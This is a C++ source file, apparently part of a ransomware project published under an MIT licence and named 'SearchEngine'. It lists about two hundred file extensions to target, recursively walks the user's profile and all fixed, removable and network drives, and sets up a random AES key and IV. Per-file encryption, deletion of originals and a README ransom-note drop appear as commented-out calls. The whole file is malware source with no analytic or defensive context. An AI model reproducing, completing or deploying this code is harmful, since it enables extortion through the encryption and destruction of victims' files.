/*
MIT License

Copyright (c) 2022 kadzicu

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/


#include "SearchEngine.h"

std::vector<String> ext
{
    _T("txt"),    _T("jar"),    _T("dat"),   _T("contact"), _T("settings"), _T("doc"),     _T("docx"), _T("xls"),
    _T("xlsx"),   _T("ppt"),    _T("pptx"),  _T("odt"),     _T("jpg"),      _T("png"),     _T("jpeg"), _T("gif"),   _T("csv"),
    _T("py"),     _T("sql"),    _T("mdb"),   _T("sln"),     _T("php"),      _T("asp"),     _T("aspx"), _T("html"),  _T("htm"),
    _T("xml"),    _T("psd"),    _T("pdf"),   _T("dll"),     _T("c"),        _T("cs"),      _T("vb"),   _T("mp3"),   _T("mp4"),
    _T("dwg"),    _T("cpp"),    _T("zip"),   _T("rar"),     _T("mov"),      _T("rtf"),     _T("bmp"),  _T("mkv"),   _T("avi"),
    _T("apk"),    _T("lnk"),    _T("iso"),   _T("7z"),      _T("ace"),      _T("arj"),     _T("bz2"),  _T("cab"),   _T("gzip"),
    _T("lzh"),    _T("tar"),    _T("uue"),   _T("xz"),      _T("z"),        _T("001"),     _T("mpeg"), _T("mpg"),   _T("core"),
    _T("crproj"), _T("pdb"),    _T("ico"),   _T("pas"),     _T("db"),       _T("torrent"), _T("3dm"),  _T("3g2"),   _T("f3d"),
    _T("3gp"),    _T("aaf"),    _T("accdb"), _T("aep"),     _T("aepx"),     _T("aet"),     _T("ai"),   _T("aif"),   _T("arw"),
    _T("as"),     _T("as3"),    _T("asf"),   _T("asx"),     _T("bay"),      _T("cdr"),     _T("cer"),  _T("class"), _T("cr2"),
    _T("crt"),    _T("crw"),    _T("dbf"),   _T("dcr"),     _T("der"),      _T("dng"),     _T("docb"), _T("docm"),  _T("dot"),
    _T("dotm"),   _T("dotx"),   _T("dxf"),   _T("dxg"),     _T("efx"),      _T("eps"),     _T("erf"),  _T("fla"),   _T("flv"),
    _T("idml"),   _T("iff"),    _T("indb"),  _T("indd"),    _T("indl"),     _T("indt"),    _T("inx"),  _T("java"),  _T("kdc"),
    _T("m3u"),    _T("m3u8"),   _T("m4u"),   _T("max"),     _T("mdf"),      _T("mef"),     _T("mid"),  _T("mpa"),   _T("mrw"),
    _T("msg"),    _T("nef"),    _T("nrw"),   _T("odb"),     _T("odc"),      _T("odm"),     _T("odp"),  _T("ods"),   _T("orf"),
    _T("p12"),    _T("p7b"),    _T("p7c"),   _T("pef"),     _T("pem"),      _T("pfx"),     _T("plb"),  _T("pmd"),   _T("pot"),
    _T("potm"),   _T("potx"),   _T("ppam"),  _T("ppj"),     _T("pps"),      _T("ppsm"),    _T("ppsx"), _T("pptm"),
    _T("prel"),   _T("prproj"), _T("ps"),    _T("pst"),     _T("ptx"),      _T("r3d"),     _T("ra"),   _T("raf"),   _T("raw"),
    _T("rb"),     _T("rw2"),    _T("rwl"),   _T("sdf"),     _T("sldm"),     _T("sldx"),    _T("sr2"),  _T("srf"),   _T("srw"),
    _T("svg"),    _T("swf"),    _T("tif"),   _T("vcf"),     _T("vob"),      _T("wav"),     _T("wb2"),  _T("wma"),   _T("wmv"),
    _T("wpd"),    _T("wps"),    _T("x3f"),   _T("xla"),     _T("xlam"),     _T("xlk"),     _T("xll"),  _T("xlm"),   _T("xlsb"),
    _T("xlsm"),   _T("xlt"),    _T("xltm"),  _T("xltx"),    _T("xlw"),      _T("xqx")
};

VOID SearchEngine::FindFile(String dir) 
{
    dir += _T("\\");
    WIN32_FIND_DATA FindData;
    HANDLE hFind{ FindFirstFile((dir + _T("*")).c_str(), &FindData) };

    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (!lstrcmp(FindData.cFileName, _T(".")) ||
                !lstrcmp(FindData.cFileName, _T("..")) ||
                FindData.cFileName[0] == _T('.'))
                continue;

            String Path{ dir + FindData.cFileName };
            //Utils::Readme(dir + _T("\\README.txt"));

            if (!(FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                !(FindData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) &&
                !(FindData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) &&
                !(FindData.dwFileAttributes & FILE_ATTRIBUTE_READONLY))
                if (Utils::Contains(ext, Utils::GetFileExt(Path)))
                {
                    //Utils::Encrypt(key, iv, Path);
                    //DeleteFile(Path.c_str());
                }

            if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&
                !(FindData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) &&
                !(FindData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN))
                FindFile(Path);
        } while (FindNextFile(hFind, &FindData));

        FindClose(hFind);
    }
}

VOID SearchEngine::Start()
{
    std::vector<String> drives
    {
        _T("C:\\Users\\") + Utils::UserName(),
        _T("K:"), _T("L:"), _T("M:"), _T("N:"), _T("O:"),
        _T("D:"), _T("A:"), _T("B:"), _T("F:"), _T("Q:"),
        _T("G:"), _T("H:"), _T("R:"), _T("S:"), _T("J:"),
        _T("U:"), _T("W:"), _T("V:"), _T("X:"), _T("T:"),
        _T("Y:"), _T("Z:"), _T("E:"), _T("P:"), _T("I:")
    };

    for (const auto& drive : drives)
        if (Utils::DirectoryExists(drive))
            if (GetDriveType(drive.c_str()) == DRIVE_FIXED ||
                GetDriveType(drive.c_str()) == DRIVE_REMOVABLE ||
                GetDriveType(drive.c_str()) == DRIVE_REMOTE ||
                GetDriveType(drive.c_str()) == DRIVE_NO_ROOT_DIR)
                FindFile(drive);
}

SearchEngine::SearchEngine() : 
    key{ CryptoPP::AES::DEFAULT_KEYLENGTH }, 
    iv{ CryptoPP::AES::BLOCKSIZE }
{
    prng.GenerateBlock(key, key.size());
    prng.GenerateBlock(iv, iv.size());
}